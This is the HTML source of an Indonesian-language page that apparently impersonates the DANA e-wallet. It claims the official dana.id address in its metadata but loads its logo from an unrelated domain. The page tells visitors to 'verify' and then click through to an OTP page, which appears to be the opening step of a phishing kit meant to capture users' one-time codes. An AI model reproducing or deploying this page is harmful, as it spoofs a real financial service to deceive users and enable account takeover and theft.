<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>𝗗𝗔𝗡𝗔 𝗜𝗗 || 𝗔𝗞𝗧𝗜𝗙𝗞𝗔𝗡 𝗙𝗜𝗧𝗨𝗥</title>
  <meta name="description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">

  <!-- Open Graph -->
  <meta property="og:title" content="𝗗𝗔𝗡𝗔 𝗜𝗗 || 𝗔𝗞𝗧𝗜𝗙𝗞𝗔𝗡 𝗙𝗜𝗧𝗨𝗥">
  <meta property="og:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
  <meta property="og:image" content="https://dana.zalnir.biz.id/images/img-dana_logo.png">
  <meta property="og:url" content="https://www.dana.id/">
  <meta property="og:type" content="website">

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 𝗜𝗗 || 𝗔𝗞𝗧𝗜𝗙𝗞𝗔𝗡 𝗙𝗜𝗧𝗨𝗥">
  <meta name="twitter:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
  <meta name="twitter:image" content="https://dana.zalnir.biz.id/images/img-dana_logo.png">
  <style>
    body{
      margin:0;
      background:#0da0ff;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      font-family:sans-serif;
    }
    .wrap{
      width:100%;
      max-width:420px;
      text-align:center;
    }
    .card{
      background:#fff;
      border-radius:20px;
      padding:16px;
      box-shadow:0 6px 18px rgba(0,0,0,0.12);
    }
    .card img{
      max-width:100%;
      border-radius:12px;
      display:block;
      margin:0 auto;
    }
    .buttons{
      display:flex;
      gap:12px;
      margin-top:14px;
    }
    button{
      flex:1;
      padding:10px;
      border-radius:8px;
      font-weight:bold;
      cursor:pointer;
      border:2px solid transparent;
    }
    .tolak{
      border-color:#e07a7a;
      color:#c13a3a;
      background:#fff;
    }
    .verif{
      border-color:#1b9cff;
      color:#1b9cff;
      background:#fff;
    }
    .note{
      margin-top:12px;
      font-size:13px;
      color:#666; /* abu-abu */
    }
    .lanjut{
      margin-top:8px;
      width:100%;
      background:#007bff;
      color:#fff;
      border:none;
      padding:12px;
      border-radius:10px;
      font-weight:700;
      cursor:pointer;
    }
  </style>
</head>
<link rel="canonical" href="https://www.dana.id/">
<meta property="og:url" content="">
<meta property="og:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
<meta property="twitter:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
<body>
  <div class="wrap">
    <div class="card">
      <!-- ganti src sesuai path gambar Anda -->
      <img src="img/perintah.png" alt="Mockup" />


      <div class="note">
        Jika Sudah Di Verifikasi Baru Klik<br>
        Lanjutkan Kode PEMUNCULAN
      </div>

      <!-- Tombol lanjut akan redirect ke otp.html -->
      <form action="otp.html" method="get">
        <button type="submit" class="lanjut">LANJUTKAN KODE PEMUNCULAN</button>
      </form>
    </div>
  </div>
</body>
</html>
